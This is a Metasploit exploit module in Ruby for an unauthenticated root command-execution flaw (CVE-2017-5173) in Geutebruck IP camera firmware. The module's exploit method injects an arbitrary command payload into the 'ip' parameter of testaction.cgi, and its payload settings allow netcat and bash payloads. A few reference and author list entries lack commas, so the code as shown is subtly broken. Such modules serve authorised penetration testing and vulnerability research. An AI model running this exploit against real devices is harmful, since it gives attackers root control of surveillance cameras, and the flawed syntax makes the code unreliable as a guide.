##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Geutebruck testaction.cgi Remote Command Execution',
      'Description'    => %q{
        This module exploits a an arbitrary command execution vulnerability. The
        vulnerability exists in the /uapi-cgi/viewer/testaction.cgi page and allows an
        anonymous user to execute arbitrary commands with root privileges.
        Firmware <= 1.11.0.12 are concerned.
        Tested on 5.02024 G-Cam/EFD-2250 running 1.11.0.12 firmware.
      },
      'Author'         =>
        [
          'Davy Douhine',	#CVE-2017-5173 (RCE) and metasploit module
          'Florent Montel' 	#CVE-2017-5174 (Authentication bypass)
          'Frederic Cikala' #CVE-2017-5174 (Authentication bypass)
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2017-5173' ],
          [ 'CVE', '2017-5174' ],
          [ 'URL', 'http://geutebruck.com' ]
          [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-17-045-02' ]
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'DisableNops' => true,
          'Space'       => 1024,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'generic netcat bash',
            }
        },
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Targets'        => [[ 'Automatic', { }]],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Aug 16 2016'))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to webapp', '/uapi-cgi/viewer/testaction.cgi']),
      ], self.class)
  end

  def exploit
    uri = normalize_uri(target_uri.path)
    print_status("#{rhost}:#{rport} - Attempting to exploit...")
    command = payload.encoded
    res = send_request_cgi(
      {
        'uri'    => uri,
        'method' => 'POST',
        'vars_post' => {
          'type' => "ip",
          'ip' => "eth0 1.1.1.1;#{command}",
        },
    })
  end

end